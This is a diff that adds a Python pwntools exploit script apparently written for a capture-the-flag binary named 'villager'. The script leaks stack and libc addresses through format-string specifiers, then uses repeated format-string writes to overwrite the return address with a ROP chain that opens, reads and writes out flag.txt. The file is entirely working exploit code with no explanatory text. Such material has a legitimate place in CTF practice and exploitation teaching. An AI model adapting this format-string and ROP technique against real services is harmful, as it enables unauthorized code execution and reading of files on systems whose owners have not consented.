@@ -1,0 +1,115 @@
+import sys
+import logging
+import binascii
+from pwn import *
+
+logging.basicConfig(level=logging.INFO, format="%(message)s")
+#logging.disable(logging.CRITICAL)
+
+elf = ELF("./villager")
+# libc = ELF("")
+libc = elf.libc
+
+if len(sys.argv) == 2:
+    program_name = sys.argv[1]
+    target = process(program_name)
+    logging.info("***local exploit ***")
+    
+else:
+    #HOST = "ctfq.sweetduet.info"
+    #PORT = 10001
+    HOST = "localhost"
+    PORT = 4080
+    logging.info("***remote exploit ***")
+    logging.info("[*]target host : " + HOST)
+    logging.info("[*]target port : " + str(PORT))
+    target = remote(HOST, PORT)
+
+    ###address###
+
+# open_offset = 0xd24a0
+# read_offset = 0xd2920
+# write_offset = 0xd29a0
+# pop2_ret_off = 0x2a60b
+# pop3_ret_off = 0x12db2f
+
+open_offset = 0xe50a0
+read_offset = 0xe5620
+write_offset = 0xe56f0
+pop2_ret_off = 0x7e6
+pop3_ret_off = 0x79d
+
+
+    ###main###
+def main():
+    logging.info("main!!")
+    #__ = input("start?")
+    
+    ###payload###
+    #payload = p32(open_addr)
+    
+    _ = target.recvuntil("name?\n")
+    target.sendline(b"AAAA%78$p")
+    buf_addr = int(target.recvuntil("\n")[8:18], 16)
+    ret_addr = buf_addr + 4
+    buf_addr = buf_addr
+    logging.info(ret_addr)
+
+    _ = target.recvuntil("name?\n")
+    target.sendline(b"BBBB%91$p")
+    main_ret_addr = target.recvuntil("\n")[8:16]
+    logging.info(main_ret_addr)
+    libc_base_addr = int(main_ret_addr, 16) - 241
+    logging.info(libc_base_addr)
+    logging.info(type(libc_base_addr))
+
+    open_addr = libc_base_addr + open_offset
+    read_addr = libc_base_addr + read_offset
+    write_addr = libc_base_addr + write_offset
+
+    pop2_ret_addr = libc_base_addr + pop2_ret_off
+    pop3_ret_addr = libc_base_addr + pop3_ret_off
+
+    payload_len = 4 * 14
+
+    retaddr_for_payload = int(hex(ret_addr), 16)
+    
+    payload = {
+        retaddr_for_payload: int(hex(open_addr), 16),
+        retaddr_for_payload+4: int(hex(pop2_ret_addr), 16),
+        retaddr_for_payload+8: int(hex(buf_addr + payload_len + 4), 16),
+        retaddr_for_payload+12: int(hex(0), 16),
+        retaddr_for_payload+16: int(hex(read_addr), 16),
+        retaddr_for_payload+20: int(hex(pop3_ret_addr), 16),
+        retaddr_for_payload+24: int(hex(3), 16),
+        retaddr_for_payload+28: int(hex(buf_addr + payload_len + 4), 16),
+        retaddr_for_payload+32: int(hex(255), 16),
+        retaddr_for_payload+36: int(hex(write_addr), 16),
+        retaddr_for_payload+40: int(hex(pop3_ret_addr), 16),
+        retaddr_for_payload+44: int(hex(1), 16),
+        retaddr_for_payload+48: int(hex(buf_addr + payload_len + 4), 16),
+        retaddr_for_payload+52: int(hex(255), 16),
+        retaddr_for_payload+56: int("flag.txt".encode('utf-8').hex(), 16),
+    }    
+
+    i = 0
+    for pay in payload:
+        logging.info("###payload###")
+        logging.info(pay)
+        logging.info("[*] round " + str(i))
+        _ = target.recvuntil("name?\n")
+        target.sendline(fmtstr_payload(7, pay, numbwritten = 4 * i, write_size='short'))
+        i += 1
+        
+
+    ret = target.recvuntil("name?\n")
+    target.sendline("")
+    ret += target.recv(25)
+    print(ret)
+                  
+    
+if __name__ == "__main__":
+    main()
+
+
+            
